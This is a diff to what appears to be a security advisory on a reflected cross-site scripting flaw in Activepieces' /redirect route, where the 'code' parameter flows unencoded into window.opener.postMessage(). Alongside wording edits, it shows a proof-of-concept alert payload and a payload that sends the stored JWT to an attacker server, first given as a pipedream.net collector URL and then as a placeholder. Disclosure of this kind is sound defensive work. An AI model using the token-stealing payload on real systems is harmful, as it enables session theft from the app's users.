@@ -74,7 +74,7 @@ try {
 }
 ```
 
-the app object defines an interesting route `/redirect` that accepts user input from the *code* parameter. 
+The *app* object defines an interesting route `/redirect` which accepts user input from the *code* query parameter. 
 
 **activepieces/packages/backend/src/main.ts**
 
@@ -97,9 +97,9 @@ app.get(
 );
 ```
 
-As we can see, when the *code* parameter is set, the code flows to the *else* branch and returns an HTML containing the user input passed as a parameter to the *window.opener.postMessage(),* the parameter misses sanitization such as HTML encoding or URL encoding before it's reflected in the browser. 
+As we can see, when the *code* parameter is set, the code flows to the *else* branch and returns an HTML containing the user input passed as a parameter to the *window.opener.postMessage(),* the parameter lacks sanitization such as HTML or URL encoding before it's reflected in the browser. 
 
-Crafting a payload that closes the called function following it with our payload will eventually look as follows:
+Crafting a payload that closes the called function, following it with our payload will eventually look as follows:
 
 ```
 test' },'*')} else alert('poc');//
@@ -108,7 +108,7 @@ test' },'*')} else alert('poc');//
  This can be also leveraged to steal the authenticated JWT token:
 
 ```
-test' },'*')} else { const xhr = new XMLHttpRequest();xhr.open('GET', '[https://](https://enxwjqx3bxw4.x.pipedream.net/)<your server>' + localStorage.getItem('token'));xhr.send(); }//
+test' },'*')} else { const xhr = new XMLHttpRequest();xhr.open('GET', '<your server>' + localStorage.getItem('token'));xhr.send(); }//
 ```
 
 ## Patch
